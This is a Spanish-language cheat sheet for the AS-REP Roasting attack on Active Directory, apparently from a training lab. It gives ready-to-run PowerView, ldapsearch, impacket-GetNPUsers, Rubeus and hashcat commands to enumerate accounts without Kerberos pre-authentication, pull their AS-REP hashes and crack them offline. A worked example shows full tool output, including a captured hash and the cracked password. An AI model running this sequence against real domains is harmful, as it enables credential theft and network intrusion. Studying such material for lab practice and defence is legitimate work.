# ASREPRoasting attack
- ASREPRoasting es otro ataque que pide TGT que **NO requieran pre-auth en kerberos**.
-Al obtener el TGT, el atacante puede extraer hashes y realizar ataques de fuerza bruta offline.

## Con powerview
- Importante tener cargado powerview.ps1 y todo el armatoste en la maquina windows comprometida
- `Import-Module .\PowerView.ps1`
- `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth`

## con LDAP search
- `ldapsearch -x -H ldap://<domain_controller> -D "<username>" -w <password> -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`

## Solicitar TGT
- `impacket-GetNPUsers DOMINIO.LOCAL/ -usersfile users.txt -format hashcat -dc-ip <domain_controller_ip>`
- `PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`

## hashcat
- `hashcat -m 18200 hashes.txt /path/to/wordlist`

### Ejemplo:

#### Chequeo con powerview:
```powershell
PS C:\Tools> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth


DistinguishedName     : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
DoesNotRequirePreAuth : True
Enabled               : True
GivenName             : Yolanda
Name                  : Yolanda Groce
ObjectClass           : user
ObjectGUID            : 6e5a4731-13f0-4335-a64c-7ecba3790c00
SamAccountName        : ygroce
SID                   : S-1-5-21-3842939050-3880317879-2865463114-1159
Surname               : Groce
UserPrincipalName     : ygroce@inlanefreight.local

DistinguishedName     : CN=Matthew Morgan,OU=Server
                        Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
DoesNotRequirePreAuth : True
Enabled               : True
GivenName             : Matthew
Name                  : Matthew Morgan
ObjectClass           : user
ObjectGUID            : c8328fe9-d7c7-467b-a27a-d7596956ab6c
SamAccountName        : mmorgan
SID                   : S-1-5-21-3842939050-3880317879-2865463114-1170
Surname               : Morgan
UserPrincipalName     : mmorgan@inlanefreight.local

PS C:\Tools>
```

#### impacet-GetNPUsers:
```bash
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers INLANEFREIGHT.LOCAL/mmorgan -format hashcat -dc-ip 172.16.5.5 -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for mmorgan
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e1034005739d1367aaea1031abeb7$a7f098dfc5e538c5e1fe1eeecb127d259150bf3940beb991af3ba43ca36c0149d3b8d48f9e9b5726f58b5f0cb6901e0dba93a47a2baee327e95c40b6f05dc33bcc500df3f997fb10b7374e2724d08c93ea722f134025105dd100fcbc2ef6a6abe252c2c13055b28b8475d4d4f93203eb258a89be2190e0350470f121dfec1015d3a490271198b4564fd397d30050b6f3027416c117fa81513464f8cb7e06484a68d063b1d95c6c21441f0eae855636d51608f2fa4548d5674dd87cb691feee980183f1902fb85a82422ef0f7171872bb1f333c2904f53ea504ac249e4669259ffd39abe12c166c7160bb6ecf48efd0754f2c497af07bed53ffb1
```

#### Hashcat
```powershell
PS C:\Users\Grunt\Desktop\hashcat-6.2.6> .\hashcat.exe hash.txt -m 18200 .\rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3628.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 122 MB

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e1034005739d1367aaea1031abeb7$a7f098dfc5e538c5e1fe1eeecb127d259150bf3940beb991af3ba43ca                                                                                                           a36c0149d3b8d48f9e9b5726f58b5f0cb6901e0dba93a47a2baee327e95c40b6f05dc33bcc500df3f997fb10b7374e2724d08c93ea722f134025105dd100fcbc2ef6a                                                                                                           a6abe252c2c13055b28b8475d4d4f93203eb258a89be2190e0350470f121dfec1015d3a490271198b4564fd397d30050b6f3027416c117fa81513464f8cb7e06484a6                                                                                                           68d063b1d95c6c21441f0eae855636d51608f2fa4548d5674dd87cb691feee980183f1902fb85a82422ef0f7171872bb1f333c2904f53ea504ac249e4669259ffd39a                                                                                                           abe12c166c7160bb6ecf48efd0754f2c497af07bed53ffb1:Welcome!00

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e10340...53ffb1
Time.Started.....: Mon Jan 20 18:36:50 2025 (0 secs)
Time.Estimated...: Mon Jan 20 18:36:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 18903.4 kH/s (4.23ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10551296/14344384 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10092544/14344384 (70.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: angella14 -> TUGGAB8
Hardware.Mon.#1..: Temp: 54c Fan:  0% Util: 16% Core: 468MHz Mem:1742MHz Bus:8

Started: Mon Jan 20 18:36:34 2025
Stopped: Mon Jan 20 18:36:51 2025
PS C:\Users\Grunt\Desktop\hashcat-6.2.6>
```